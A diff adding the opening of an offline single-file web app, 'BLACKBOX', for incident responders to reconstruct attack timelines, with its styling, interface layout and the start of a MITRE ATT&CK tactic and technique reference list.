@@ -1,0 +1,1921 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>BLACKBOX // Attack Timeline Reconstruction</title>
+<style>
+:root{
+  --void:#06080e;
+  --panel:#0a0f19;
+  --panel2:#0d1524;
+  --raise:#111b2c;
+  --line:rgba(120,200,255,.14);
+  --line2:rgba(120,200,255,.28);
+  --cy:#22e8ff;
+  --mg:#ff2e88;
+  --am:#ffb020;
+  --vi:#9d6bff;
+  --gr:#4dff9a;
+  --rd:#ff4d5e;
+  --ink:#c3d4e6;
+  --dim:#6d8299;
+  --dimmer:#44576b;
+  --mono:'JetBrains Mono','IBM Plex Mono','Cascadia Mono',ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  --sans:ui-sans-serif,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+  --notch:polygon(0 0, calc(100% - 12px) 0, 100% 12px, 100% 100%, 12px 100%, 0 calc(100% - 12px));
+}
+*{box-sizing:border-box}
+html,body{height:100%}
+body{
+  margin:0;background:var(--void);color:var(--ink);
+  font-family:var(--mono);font-size:13px;line-height:1.45;
+  -webkit-font-smoothing:antialiased;
+  background-image:
+    linear-gradient(rgba(34,232,255,.030) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(34,232,255,.030) 1px,transparent 1px),
+    radial-gradient(ellipse at 50% -20%,rgba(34,232,255,.10),transparent 60%);
+  background-size:52px 52px,52px 52px,100% 100%;
+}
+::selection{background:rgba(34,232,255,.28)}
+button,input,select,textarea{font-family:inherit;font-size:inherit;color:inherit}
+:focus-visible{outline:2px solid var(--cy);outline-offset:2px}
+
+/* ---------- scrollbars ---------- */
+::-webkit-scrollbar{width:10px;height:10px}
+::-webkit-scrollbar-track{background:#05070c}
+::-webkit-scrollbar-thumb{background:#1b2c42;border:2px solid #05070c}
+::-webkit-scrollbar-thumb:hover{background:#27455f}
+
+/* ---------- app shell ---------- */
+#app{display:flex;flex-direction:column;height:100vh;height:100dvh;overflow:hidden}
+
+.topbar{
+  display:flex;align-items:center;gap:16px;padding:0 14px;height:54px;flex:0 0 54px;
+  border-bottom:1px solid var(--line);background:linear-gradient(180deg,#0b1220,#070b13);
+  position:relative;z-index:30;
+}
+.topbar::after{
+  content:'';position:absolute;inset:0;pointer-events:none;
+  background:repeating-linear-gradient(0deg,rgba(34,232,255,.05) 0 1px,transparent 1px 3px);
+  mix-blend-mode:screen;opacity:.5;
+}
+.brand{display:flex;align-items:baseline;gap:9px;flex:0 0 auto;position:relative;z-index:2}
+.brand b{
+  font-size:16px;font-weight:700;letter-spacing:.34em;color:var(--cy);
+  text-shadow:0 0 14px rgba(34,232,255,.55);
+}
+.brand span{font-size:9px;letter-spacing:.26em;color:var(--dimmer);text-transform:uppercase}
+.brand .dot{width:7px;height:7px;background:var(--gr);box-shadow:0 0 10px var(--gr);align-self:center;animation:pulse 2.6s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.25}}
+
+.caseband{display:flex;align-items:center;gap:8px;flex:1 1 auto;min-width:0;position:relative;z-index:2}
+.caseband input{
+  background:transparent;border:0;border-bottom:1px dashed transparent;
+  padding:3px 2px;min-width:60px;
+}
+.caseband input:hover{border-bottom-color:var(--line2)}
+.caseband input:focus{border-bottom-color:var(--cy);outline:none}
+#caseName{font-size:14px;letter-spacing:.06em;color:#eaf6ff;flex:1 1 auto;min-width:120px}
+#caseNumber{width:130px;color:var(--am);font-size:11px;letter-spacing:.1em}
+.topact{display:flex;gap:6px;flex:0 0 auto;position:relative;z-index:2}
+
+.btn{
+  background:#0c1524;border:1px solid var(--line2);color:var(--ink);
+  padding:6px 11px;cursor:pointer;letter-spacing:.13em;font-size:10.5px;text-transform:uppercase;
+  transition:.14s;white-space:nowrap;
+  clip-path:polygon(0 0,calc(100% - 7px) 0,100% 7px,100% 100%,7px 100%,0 calc(100% - 7px));
+}
+.btn:hover{background:#13233a;border-color:var(--cy);color:#eaf6ff;box-shadow:0 0 14px rgba(34,232,255,.22)}
+.btn:active{transform:translateY(1px)}
+.btn.pri{background:linear-gradient(180deg,#0f3f52,#0a2836);border-color:var(--cy);color:var(--cy)}
+.btn.pri:hover{background:linear-gradient(180deg,#155a75,#0d3548)}
+.btn.mag{border-color:rgba(255,46,136,.5);color:var(--mg)}
+.btn.mag:hover{border-color:var(--mg);box-shadow:0 0 14px rgba(255,46,136,.25);background:#1d1020}
+.btn.sm{padding:3px 7px;font-size:9.5px;letter-spacing:.1em}
+.btn.ghost{background:transparent;border-color:var(--line)}
+.btn[disabled]{opacity:.35;cursor:not-allowed}
+
+.dirty{color:var(--am);font-size:9px;letter-spacing:.2em;opacity:0;transition:.2s;white-space:nowrap}
+.dirty.on{opacity:1}
+
+/* ---------- body split ---------- */
+.split{display:flex;flex:1 1 auto;min-height:0}
+
+.sidebar{
+  flex:0 0 254px;border-right:1px solid var(--line);background:rgba(8,12,20,.72);
+  overflow-y:auto;padding:12px;display:flex;flex-direction:column;gap:14px;
+}
+.sbtitle{
+  font-size:9px;letter-spacing:.26em;color:var(--dimmer);text-transform:uppercase;
+  display:flex;align-items:center;gap:8px;margin-bottom:7px;
+}
+.sbtitle::after{content:'';flex:1;height:1px;background:var(--line)}
+.field{display:flex;flex-direction:column;gap:4px;margin-bottom:8px}
+.field label{font-size:9px;letter-spacing:.16em;color:var(--dim);text-transform:uppercase}
+input[type=text],input[type=url],input[type=number],select,textarea{
+  background:#060a12;border:1px solid var(--line);color:var(--ink);padding:6px 8px;width:100%;
+  transition:.14s;
+}
+input:focus,select:focus,textarea:focus{outline:none;border-color:var(--cy);box-shadow:0 0 0 1px rgba(34,232,255,.25),inset 0 0 12px rgba(34,232,255,.06)}
+input::placeholder,textarea::placeholder{color:var(--dimmer)}
+select{cursor:pointer;appearance:none;background-image:linear-gradient(45deg,transparent 50%,var(--dim) 50%),linear-gradient(135deg,var(--dim) 50%,transparent 50%);background-position:calc(100% - 14px) 12px,calc(100% - 9px) 12px;background-size:5px 5px,5px 5px;background-repeat:no-repeat;padding-right:26px}
+select option{background:#0b111c}
+textarea{resize:vertical;min-height:60px;line-height:1.5}
+
+.stats{display:grid;grid-template-columns:1fr 1fr;gap:6px}
+.stat{background:var(--panel2);border:1px solid var(--line);padding:7px 8px}
+.stat b{display:block;font-size:19px;font-weight:600;letter-spacing:.02em;color:#eaf6ff;line-height:1.1}
+.stat span{font-size:8.5px;letter-spacing:.16em;color:var(--dim);text-transform:uppercase}
+.stat.acc b{color:var(--cy);text-shadow:0 0 12px rgba(34,232,255,.4)}
+.stat.warn b{color:var(--mg);text-shadow:0 0 12px rgba(255,46,136,.35)}
+
+.chiprow{display:flex;flex-wrap:wrap;gap:4px}
+.fchip{
+  border:1px solid var(--line);background:#080d16;padding:3px 7px;font-size:9.5px;cursor:pointer;
+  letter-spacing:.08em;color:var(--dim);transition:.12s;user-select:none;
+}
+.fchip:hover{border-color:var(--line2);color:var(--ink)}
+.fchip.on{border-color:currentColor;background:rgba(34,232,255,.08);color:var(--cy)}
+
+/* ---------- main ---------- */
+main{flex:1 1 auto;min-width:0;display:flex;flex-direction:column}
+.tabs{
+  display:flex;gap:0;border-bottom:1px solid var(--line);background:rgba(7,11,19,.9);
+  flex:0 0 auto;overflow-x:auto;
+}
+.tab{
+  background:transparent;border:0;border-bottom:2px solid transparent;padding:11px 18px;cursor:pointer;
+  font-size:10px;letter-spacing:.2em;text-transform:uppercase;color:var(--dim);transition:.14s;white-space:nowrap;
+}
+.tab:hover{color:var(--ink);background:rgba(34,232,255,.04)}
+.tab.on{color:var(--cy);border-bottom-color:var(--cy);text-shadow:0 0 12px rgba(34,232,255,.5);background:linear-gradient(180deg,transparent,rgba(34,232,255,.07))}
+.tab .n{color:var(--dimmer);margin-left:7px;font-size:9px}
+.viewport{flex:1 1 auto;min-height:0;overflow:auto;position:relative}
+.view{display:none;padding:14px}
+.view.on{display:block}
+.view.flush{padding:0}
+
+.toolbar{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:12px}
+.toolbar .sp{flex:1}
+.seg{display:flex;border:1px solid var(--line);}
+.seg button{background:transparent;border:0;padding:5px 10px;cursor:pointer;font-size:9.5px;letter-spacing:.13em;color:var(--dim);text-transform:uppercase}
+.seg button.on{background:rgba(34,232,255,.12);color:var(--cy)}
+.seg button:hover{color:var(--ink)}
+
+/* ---------- table ---------- */
+.tbl{width:100%;border-collapse:collapse;font-size:12px}
+.tbl th{
+  position:sticky;top:0;z-index:5;background:#0b1220;text-align:left;padding:8px 9px;
+  font-size:9px;letter-spacing:.18em;color:var(--dim);text-transform:uppercase;font-weight:500;
+  border-bottom:1px solid var(--line2);white-space:nowrap;
+}
+.tbl td{padding:7px 9px;border-bottom:1px solid rgba(120,200,255,.07);vertical-align:top}
+.tbl tbody tr{cursor:pointer;transition:.1s}
+.tbl tbody tr:hover{background:rgba(34,232,255,.055)}
+.tbl tbody tr.sel{background:rgba(34,232,255,.10);box-shadow:inset 2px 0 0 var(--cy)}
+.tbl tbody tr.key td:first-child{box-shadow:inset 3px 0 0 var(--am)}
+.tbl .num{color:var(--dimmer);font-size:10px}
+td.tw{max-width:320px}
+.wrap{white-space:pre-wrap;word-break:break-word}
+.mutedrow td{color:var(--dim)}
+
+.cmd{
+  display:block;background:#04070d;border-left:2px solid var(--vi);padding:5px 8px;margin-top:5px;
+  color:#9fe8ff;font-size:11px;white-space:pre-wrap;word-break:break-all;max-height:150px;overflow:auto;
+}
+.expand{background:#070c15}
+.expand td{padding:10px 14px 14px}
+.kv{display:grid;grid-template-columns:auto 1fr;gap:3px 14px;font-size:11.5px}
+.kv dt{color:var(--dim);letter-spacing:.1em;font-size:9.5px;text-transform:uppercase;padding-top:2px}
+.kv dd{margin:0;word-break:break-word}
+
+/* ---------- chips / badges ---------- */
+.badge{
+  display:inline-block;padding:1px 6px;font-size:9.5px;letter-spacing:.09em;
+  border:1px solid currentColor;white-space:nowrap;line-height:1.5;
+}
+.badge.solid{color:#04070d;border-color:transparent}
+.tac{display:inline-flex;align-items:center;gap:5px;white-space:nowrap;font-size:10px;letter-spacing:.06em}
+.tac i{width:8px;height:8px;flex:0 0 8px;display:block;transform:rotate(45deg)}
+.tid{color:var(--dim);font-size:10px}
+.ind{color:var(--am);word-break:break-all;font-size:11.5px}
+.ind .t{color:var(--dimmer);font-size:9px;letter-spacing:.12em;text-transform:uppercase;margin-right:5px}
+.usr{color:var(--gr)}
+.prv{color:var(--rd);font-size:9.5px;letter-spacing:.08em}
+.ts{color:#8fd7ff;white-space:nowrap;font-size:11.5px}
+.ts small{display:block;color:var(--dimmer);font-size:9px;letter-spacing:.1em}
+a.src{color:var(--cy);text-decoration:none;border-bottom:1px dotted currentColor}
+a.src:hover{text-shadow:0 0 10px rgba(34,232,255,.6)}
+.dot{display:inline-block;width:8px;height:8px;border-radius:50%;vertical-align:middle;margin-right:5px}
+.tag{display:inline-block;border:1px solid var(--line2);color:var(--dim);padding:0 5px;font-size:9px;margin:1px 3px 1px 0}
+
+/* ---------- graph ---------- */
+.graphwrap{position:relative;height:100%;overflow:auto;background:
+  radial-gradient(ellipse at 20% 0%,rgba(34,232,255,.07),transparent 55%),#05070d}
+.graphinner{position:relative;min-width:100%}
+.lanehead{
+  position:sticky;top:0;z-index:12;height:120px;
+  background:linear-gradient(180deg,#070c15 62%,rgba(7,12,21,.0));
+  border-bottom:1px solid var(--line);
+}
+.lanelbl{
+  position:absolute;bottom:8px;transform-origin:left bottom;transform:rotate(-52deg);
+  white-space:nowrap;font-size:10.5px;letter-spacing:.1em;cursor:default;
+}
+.lanelbl b{font-weight:500}
+.lanelbl s{text-decoration:none;color:var(--dimmer);font-size:9px;margin-left:6px}
+.gsvg{position:absolute;left:0;top:0;pointer-events:none}
+.gsvg .hit{pointer-events:all;cursor:pointer}
+.rows{position:relative}
+.grow{
+  position:absolute;display:flex;align-items:center;gap:10px;height:34px;padding:0 10px;cursor:pointer;
+  border:1px solid transparent;border-left:2px solid transparent;
+}
+.grow:hover{background:rgba(34,232,255,.06);border-color:var(--line)}
+.grow.sel{background:rgba(34,232,255,.12);border-color:var(--line2);border-left-color:var(--cy)}
+.grow .gt{color:#8fd7ff;font-size:11px;flex:0 0 auto;letter-spacing:.02em}
+.grow .ga{color:var(--ink);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;flex:1 1 auto;min-width:0}
+.grow .gi{color:var(--am);font-size:10.5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:230px;flex:0 1 auto}
+.grow .gu{color:var(--gr);font-size:10.5px;white-space:nowrap;flex:0 0 auto}
+.daysep{position:absolute;left:0;right:0;height:1px;background:repeating-linear-gradient(90deg,var(--line) 0 6px,transparent 6px 12px)}
+.daylbl{position:absolute;font-size:9px;letter-spacing:.22em;color:var(--dim);background:var(--void);padding:0 9px;border:1px solid var(--line);line-height:1.6}
+.legend{
+  position:sticky;bottom:0;z-index:12;display:flex;flex-wrap:wrap;gap:10px;padding:8px 12px;
+  background:rgba(6,9,15,.94);border-top:1px solid var(--line);font-size:9.5px;letter-spacing:.08em;
+}
+.legend .li{display:flex;align-items:center;gap:5px;color:var(--dim)}
+.inspector{
+  position:sticky;bottom:31px;z-index:14;margin:0;padding:12px 14px;
+  background:linear-gradient(180deg,rgba(11,19,32,.97),rgba(8,13,22,.99));
+  border-top:1px solid var(--cy);box-shadow:0 -14px 34px rgba(0,0,0,.6);
+}
+.inspector .ihead{display:flex;align-items:center;gap:10px;margin-bottom:8px}
+.inspector .ihead b{font-size:13px;color:#eaf6ff;letter-spacing:.04em}
+.inspector .ihead .sp{flex:1}
+.inspector .kv{max-height:190px;overflow-y:auto}
+#view-graph{position:relative}
+.gbody{position:relative}
+.seps{position:absolute;inset:0;pointer-events:none}
+.empty{
+  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;
+  min-height:340px;color:var(--dim);text-align:center;padding:30px;
+}
+.empty b{color:var(--cy);letter-spacing:.24em;font-size:13px;text-transform:uppercase}
+.empty p{max-width:430px;margin:0;line-height:1.7;font-size:12px}
+
+/* ---------- host cards ---------- */
+.hostgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(285px,1fr));gap:12px}
+.hcard{background:linear-gradient(160deg,var(--panel2),var(--panel));border:1px solid var(--line);padding:12px;clip-path:var(--notch);transition:.15s;cursor:pointer;position:relative}
+.hcard:hover{border-color:var(--line2);box-shadow:0 0 22px rgba(34,232,255,.10)}
+.hcard h4{margin:0 0 2px;font-size:14px;letter-spacing:.05em;color:#eaf6ff;font-weight:600;word-break:break-all}
+.hcard .ipl{color:var(--cy);font-size:11px;letter-spacing:.05em}
+.hcard .meta{color:var(--dim);font-size:10.5px;margin-top:5px}
+.hcard .bar{display:flex;height:4px;margin:10px 0 8px;background:#060a12;overflow:hidden}
+.hcard .bar i{display:block;height:100%}
+.hstats{display:grid;grid-template-columns:repeat(3,1fr);gap:6px;margin-top:8px;text-align:center}
+.hstats div{background:#070c15;border:1px solid var(--line);padding:5px 2px}
+.hstats b{display:block;color:#eaf6ff;font-size:14px}
+.hstats span{font-size:8px;letter-spacing:.14em;color:var(--dim);text-transform:uppercase}
+.statusflag{position:absolute;top:0;right:0;padding:2px 8px;font-size:9px;letter-spacing:.16em;text-transform:uppercase;color:#04070d}
+
+/* ---------- attack matrix ---------- */
+.matrix{display:flex;gap:7px;overflow-x:auto;padding-bottom:8px}
+.mcol{flex:0 0 158px;min-width:158px}
+.mcol h5{
+  margin:0 0 6px;font-size:9px;letter-spacing:.13em;text-transform:uppercase;color:var(--dim);
+  padding:6px;border-top:2px solid currentColor;background:#0a1119;
+}
+.mcell{background:#080d16;border:1px solid var(--line);padding:5px 6px;margin-bottom:4px;font-size:10px}
+.mcell.hit{background:rgba(34,232,255,.10);border-color:var(--cy);color:#dff6ff}
+.mcell b{display:block;color:var(--am);font-size:9.5px;letter-spacing:.06em}
+.mcell.hit b{color:var(--cy)}
+.mcell .c{float:right;color:var(--mg)}
+
+/* ---------- report ---------- */
+.report{max-width:980px;margin:0 auto;background:var(--panel);border:1px solid var(--line);padding:26px 30px;font-family:var(--sans);line-height:1.65;font-size:13.5px}
+.report h1,.report h2,.report h3{font-family:var(--mono);letter-spacing:.1em;text-transform:uppercase;color:var(--cy);margin:26px 0 10px}
+.report h1{font-size:17px;margin-top:0;border-bottom:1px solid var(--line2);padding-bottom:10px}
+.report h2{font-size:12px;color:#eaf6ff}
+.report h3{font-size:11px;color:var(--am)}
+.report p{margin:0 0 10px;color:#d3e2f0}
+.report ul{margin:0 0 12px;padding-left:20px}
+.report li{margin-bottom:5px}
+.report table{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:11px;margin-bottom:16px}
+.report th{background:#0b1220;text-align:left;padding:6px 8px;border:1px solid var(--line);font-size:9px;letter-spacing:.14em;text-transform:uppercase;color:var(--dim)}
+.report td{padding:6px 8px;border:1px solid rgba(120,200,255,.09);vertical-align:top}
+.report code{background:#04070d;padding:1px 5px;color:#9fe8ff;font-family:var(--mono);font-size:11.5px}
+
+/* ---------- modal ---------- */
+.overlay{
+  position:fixed;inset:0;background:rgba(2,4,8,.82);backdrop-filter:blur(3px);
+  display:flex;align-items:flex-start;justify-content:center;padding:24px 16px;z-index:100;overflow-y:auto;
+}
+.modal{
+  width:100%;max-width:880px;background:linear-gradient(170deg,#0c1421,#080d16);
+  border:1px solid var(--line2);clip-path:var(--notch);box-shadow:0 0 60px rgba(34,232,255,.14);
+  animation:rise .16s ease-out;
+}
+.modal.narrow{max-width:520px}
+@keyframes rise{from{transform:translateY(10px);opacity:0}to{transform:none;opacity:1}}
+.mhead{display:flex;align-items:center;gap:10px;padding:14px 18px;border-bottom:1px solid var(--line)}
+.mhead h3{margin:0;font-size:12px;letter-spacing:.24em;text-transform:uppercase;color:var(--cy);flex:1}
+.mbody{padding:16px 18px;max-height:calc(100vh - 190px);overflow-y:auto}
+.mfoot{display:flex;gap:8px;align-items:center;padding:12px 18px;border-top:1px solid var(--line);background:rgba(6,10,18,.6)}
+.mfoot .sp{flex:1}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px 14px}
+.grid3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px 14px}
+.span2{grid-column:span 2}
+.span3{grid-column:span 3}
+.fs{border:1px solid var(--line);padding:12px 14px 4px;margin-bottom:14px;position:relative}
+.fs legend{font-size:9px;letter-spacing:.24em;text-transform:uppercase;color:var(--dim);padding:0 7px}
+.hint{font-size:9.5px;color:var(--dimmer);letter-spacing:.04em;margin-top:3px}
+.err{color:var(--rd);font-size:10px;margin-top:3px;min-height:12px}
+.inline{display:flex;gap:6px}
+.inline input{flex:1}
+label.ck{display:flex;align-items:center;gap:7px;cursor:pointer;font-size:11px;color:var(--ink);letter-spacing:.06em}
+input[type=checkbox]{accent-color:var(--cy);width:15px;height:15px;cursor:pointer}
+
+/* ---------- toast ---------- */
+#toasts{position:fixed;right:16px;bottom:16px;z-index:200;display:flex;flex-direction:column;gap:8px;pointer-events:none}
+.toast{
+  background:#0c1826;border:1px solid var(--cy);border-left-width:3px;padding:9px 14px;font-size:11px;
+  letter-spacing:.06em;box-shadow:0 0 26px rgba(34,232,255,.2);animation:rise .16s;max-width:340px;
+}
+.toast.bad{border-color:var(--rd);box-shadow:0 0 26px rgba(255,77,94,.2);color:#ffd9dd}
+.toast.warn{border-color:var(--am);box-shadow:0 0 26px rgba(255,176,32,.2)}
+
+kbd{border:1px solid var(--line2);padding:0 4px;font-size:10px;color:var(--dim);background:#060a12}
+
+.sbtoggle{display:none}
+@media (max-width:900px){
+  .sidebar{position:fixed;left:0;top:54px;bottom:0;z-index:40;width:270px;flex-basis:270px;transform:translateX(-100%);transition:.2s;background:#080c14}
+  body.sbopen .sidebar{transform:none;box-shadow:0 0 40px rgba(0,0,0,.7)}
+  .sbtoggle{display:inline-block}
+  .brand span{display:none}
+  .grid2,.grid3{grid-template-columns:1fr}
+  .span2,.span3{grid-column:span 1}
+  .report{padding:16px}
+}
+@media (prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}
+@media print{
+  .topbar,.sidebar,.tabs,.toolbar{display:none!important}
+  body,.report{background:#fff;color:#000}
+  .report h1,.report h2,.report h3{color:#000}
+  .report td,.report th{border-color:#999;color:#000}
+}
+</style>
+</head>
+<body>
+<div id="app">
+
+  <header class="topbar">
+    <button class="btn ghost sbtoggle" id="sbToggle" title="Filters">☰</button>
+    <div class="brand"><i class="dot"></i><b>BLACKBOX</b><span>Attack Reconstruction</span></div>
+    <div class="caseband">
+      <input type="text" id="caseName" placeholder="Untitled investigation" aria-label="Case name">
+      <input type="text" id="caseNumber" placeholder="CASE-0000" aria-label="Case number">
+      <span class="dirty" id="dirtyFlag">● unsaved</span>
+    </div>
+    <div class="topact">
+      <button class="btn" id="btnNewEvent" title="Add event (N)">+ Event</button>
+      <button class="btn" id="btnNewHost" title="Add host (H)">+ Host</button>
+      <button class="btn" id="btnImport" title="Open a saved case file">Open</button>
+      <button class="btn pri" id="btnExport" title="Download case file (Ctrl+S)">Save .json</button>
+      <button class="btn ghost" id="btnMenu" title="More">⋯</button>
+    </div>
+  </header>
+
+  <div class="split">
+    <aside class="sidebar" id="sidebar">
+      <div>
+        <div class="sbtitle">Case totals</div>
+        <div class="stats">
+          <div class="stat acc"><b id="stEvents">0</b><span>Events</span></div>
+          <div class="stat"><b id="stHosts">0</b><span>Hosts</span></div>
+          <div class="stat warn"><b id="stComp">0</b><span>Compromised</span></div>
+          <div class="stat"><b id="stIoc">0</b><span>Indicators</span></div>
+        </div>
+        <div class="stat" style="margin-top:6px"><b id="stSpan" style="font-size:12px">—</b><span>Dwell / span</span></div>
+      </div>
+
+      <div>
+        <div class="sbtitle">Filters</div>
+        <div class="field">
+          <label for="fSearch">Search</label>
+          <input type="text" id="fSearch" placeholder="indicator, command, user…">
+          <div class="hint">Press <kbd>/</kbd> to jump here</div>
+        </div>
+        <div class="field">
+          <label for="fHost">Host</label>
+          <select id="fHost"><option value="">All hosts</option></select>
+        </div>
+        <div class="field">
+          <label for="fUser">Account</label>
+          <select id="fUser"><option value="">All accounts</option></select>
+        </div>
+        <div class="field">
+          <label for="fTactic">Tactic</label>
+          <select id="fTactic"><option value="">All tactics</option></select>
+        </div>
+        <div class="field">
+          <label>Confidence</label>
+          <div class="chiprow" id="fConf"></div>
+        </div>
+        <div class="field">
+          <label>Show only</label>
+          <div class="chiprow">
+            <span class="fchip" data-flag="key">Key events</span>
+            <span class="fchip" data-flag="pivot">Host pivots</span>
+            <span class="fchip" data-flag="linked">Has source link</span>
+          </div>
+        </div>
+        <div class="grid2" style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
+          <div class="field"><label for="fFrom">From</label><input type="text" id="fFrom" placeholder="YYYY-MM-DD"></div>
+          <div class="field"><label for="fTo">To</label><input type="text" id="fTo" placeholder="YYYY-MM-DD"></div>
+        </div>
+        <button class="btn ghost" id="btnClearFilters" style="width:100%">Clear filters</button>
+      </div>
+
+      <div>
+        <div class="sbtitle">Display</div>
+        <div class="field">
+          <label for="fTz">Timestamps shown in</label>
+          <select id="fTz">
+            <option value="utc">UTC</option>
+            <option value="local">Local (this browser)</option>
+            <option value="source">Source timezone</option>
+          </select>
+        </div>
+      </div>
+
+      <div style="margin-top:auto;color:var(--dimmer);font-size:9.5px;line-height:1.8;letter-spacing:.05em">
+        Runs entirely in this file — nothing leaves the browser.<br>
+        <kbd>N</kbd> event · <kbd>H</kbd> host · <kbd>/</kbd> search · <kbd>Esc</kbd> close
+      </div>
+    </aside>
+
+    <main>
+      <nav class="tabs" role="tablist">
+        <button class="tab on" data-view="graph" role="tab">Branch graph</button>
+        <button class="tab" data-view="timeline" role="tab">Timeline<span class="n" id="tabCountT">0</span></button>
+        <button class="tab" data-view="hosts" role="tab">Hosts<span class="n" id="tabCountH">0</span></button>
+        <button class="tab" data-view="pivot" role="tab">Indicators<span class="n" id="tabCountI">0</span></button>
+        <button class="tab" data-view="matrix" role="tab">ATT&amp;CK</button>
+        <button class="tab" data-view="report" role="tab">Report</button>
+      </nav>
+
+      <div class="viewport" id="viewport">
+        <section class="view on flush" id="view-graph"></section>
+        <section class="view" id="view-timeline"></section>
+        <section class="view" id="view-hosts"></section>
+        <section class="view" id="view-pivot"></section>
+        <section class="view" id="view-matrix"></section>
+        <section class="view" id="view-report"></section>
+      </div>
+    </main>
+  </div>
+</div>
+
+<div id="modalRoot"></div>
+<div id="toasts"></div>
+<input type="file" id="fileInput" accept=".json,application/json" style="display:none">
+
+<script>
+/* ============================================================
+   BLACKBOX — offline attack timeline reconstruction
+   Single file. No network calls. Data lives in memory + .json
+   ============================================================ */
+'use strict';
+
+/* ---------- MITRE ATT&CK (Enterprise) reference, offline subset ---------- */
+const TACTICS = [
+ {id:'TA0043',name:'Reconnaissance',short:'RECON',color:'#5b8dff',tech:[
+   ['T1595','Active Scanning'],['T1595.002','Vulnerability Scanning'],['T1592','Gather Victim Host Info'],
+   ['T1589','Gather Victim Identity Info'],['T1590','Gather Victim Network Info'],
+   ['T1598','Phishing for Information'],['T1596','Search Open Technical Databases'],['T1593','Search Open Websites/Domains']]},
+ {id:'TA0042',name:'Resource Development',short:'RESDEV',color:'#4f6dd6',tech:[
+   ['T1583','Acquire Infrastructure'],['T1583.001','Domains'],['T1584','Compromise Infrastructure'],
+   ['T1587','Develop Capabilities'],['T1588','Obtain Capabilities'],['T1588.002','Tool'],
+   ['T1585','Establish Accounts'],['T1608','Stage Capabilities']]},
+ {id:'TA0001',name:'Initial Access',short:'INIT',color:'#ff2e88',tech:[
+   ['T1566','Phishing'],['T1566.001','Spearphishing Attachment'],['T1566.002','Spearphishing Link'],
+   ['T1190','Exploit Public-Facing Application'],['T1133','External Remote Services'],
+   ['T1078','Valid Accounts'],['T1078.002','Domain Accounts'],['T1078.003','Local Accounts'],
+   ['T1195','Supply Chain Compromise'],['T1189','Drive-by Compromise'],
+   ['T1091','Replication Through Removable Media'],['T1200','Hardware Additions']]},
+ {id:'TA0002',name:'Execution',short:'EXEC',color:'#ff6b3d',tech:[
+   ['T1059','Command and Scripting Interpreter'],['T1059.001','PowerShell'],['T1059.003','Windows Command Shell'],
+   ['T1059.004','Unix Shell'],['T1059.005','Visual Basic'],['T1059.006','Python'],['T1059.007','JavaScript'],
+   ['T1204','User Execution'],['T1204.002','Malicious File'],['T1047','Windows Management Instrumentation'],
+   ['T1053','Scheduled Task/Job'],['T1053.005','Scheduled Task'],['T1569','System Services'],
+   ['T1569.002','Service Execution'],['T1106','Native API'],['T1203','Exploitation for Client Execution'],
+   ['T1129','Shared Modules']]},
+ {id:'TA0003',name:'Persistence',short:'PERSIST',color:'#ffb020',tech:[
+   ['T1547','Boot or Logon Autostart Execution'],['T1547.001','Registry Run Keys / Startup Folder'],
+   ['T1543','Create or Modify System Process'],['T1543.003','Windows Service'],
+   ['T1053.005','Scheduled Task'],['T1136','Create Account'],['T1136.001','Local Account'],['T1136.002','Domain Account'],
+   ['T1078','Valid Accounts'],['T1505','Server Software Component'],['T1505.003','Web Shell'],
+   ['T1546','Event Triggered Execution'],['T1546.003','WMI Event Subscription'],
+   ['T1098','Account Manipulation'],['T1574','Hijack Execution Flow'],['T1197','BITS Jobs'],
+   ['T1556','Modify Authentication Process']]},
+ {id:'TA0004',name:'Privilege Escalation',short:'PRIVESC',color:'#ff4d5e',tech:[
+   ['T1548','Abuse Elevation Control Mechanism'],['T1548.002','Bypass User Account Control'],
+   ['T1134','Access Token Manipulation'],['T1068','Exploitation for Privilege Escalation'],
+   ['T1055','Process Injection'],['T1484','Domain or Tenant Policy Modification'],
+   ['T1484.001','Group Policy Modification'],['T1078','Valid Accounts'],['T1543.003','Windows Service']]},
+ {id:'TA0005',name:'Defense Evasion',short:'EVADE',color:'#9d6bff',tech:[
+   ['T1070','Indicator Removal'],['T1070.001','Clear Windows Event Logs'],['T1070.004','File Deletion'],
+   ['T1070.006','Timestomp'],['T1027','Obfuscated Files or Information'],['T1027.010','Command Obfuscation'],
+   ['T1562','Impair Defenses'],['T1562.001','Disable or Modify Tools'],['T1562.004','Disable or Modify System Firewall'],
+   ['T1055','Process Injection'],['T1218','System Binary Proxy Execution'],['T1218.005','Mshta'],
+   ['T1218.010','Regsvr32'],['T1218.011','Rundll32'],['T1036','Masquerading'],['T1112','Modify Registry'],
+   ['T1140','Deobfuscate/Decode Files or Information'],['T1553','Subvert Trust Controls'],
+   ['T1497','Virtualization/Sandbox Evasion'],['T1620','Reflective Code Loading'],['T1207','Rogue Domain Controller'],
+   ['T1550','Use Alternate Authentication Material']]},
+ {id:'TA0006',name:'Credential Access',short:'CREDS',color:'#22e8ff',tech:[
+   ['T1003','OS Credential Dumping'],['T1003.001','LSASS Memory'],['T1003.002','Security Account Manager'],
+   ['T1003.003','NTDS'],['T1003.006','DCSync'],['T1110','Brute Force'],['T1110.003','Password Spraying'],
+   ['T1558','Steal or Forge Kerberos Tickets'],['T1558.001','Golden Ticket'],['T1558.002','Silver Ticket'],
+   ['T1558.003','Kerberoasting'],['T1558.004','AS-REP Roasting'],
+   ['T1555','Credentials from Password Stores'],['T1555.003','Credentials from Web Browsers'],
+   ['T1552','Unsecured Credentials'],['T1552.001','Credentials In Files'],
+   ['T1056','Input Capture'],['T1056.001','Keylogging'],['T1187','Forced Authentication'],
+   ['T1557','Adversary-in-the-Middle'],['T1557.001','LLMNR/NBT-NS Poisoning and SMB Relay'],
+   ['T1621','Multi-Factor Authentication Request Generation']]},
+ {id:'TA0007',name:'Discovery',short:'DISCOVER',color:'#4dff9a',tech:[
